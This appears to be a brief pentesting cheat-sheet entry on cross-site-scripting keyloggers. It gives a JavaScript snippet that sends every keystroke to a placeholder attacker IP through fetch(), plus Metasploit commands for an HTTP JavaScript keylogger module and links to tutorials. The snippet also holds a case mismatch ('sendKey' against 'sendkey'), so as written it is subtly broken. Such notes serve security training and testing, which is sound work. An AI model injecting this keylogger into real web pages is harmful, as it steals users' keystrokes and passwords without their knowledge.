# Keyloggers

Search Tag(s): #helpers #xss

## 01 - Scripts

```js
function sendKey(event) {
	fetch("http[s]://<IP>/data?k=" + event.key);
}
document.addEventListener('keydown', sendkey);
```

## 02 - Metasploit

TODO: Fill this info

```
msf > use auxiliary/server/capture/http_javascript_keylogger

msf auxiliary(server/capture/http_javascript_keylogger) > options
```

---
## References

- [IMVK: Cross Site Scripting – Exploitation ](https://imvk.net/en/infosec/ethical-web-hacking/cross-site-scripting-exploitation)

- [Geeky much: Cross-site Scripting](https://medium.com/secure-you/cross-site-scripting-b64f440ae060)

- [Rapid7: Metasploit JavaScript Keylogger](https://www.rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/)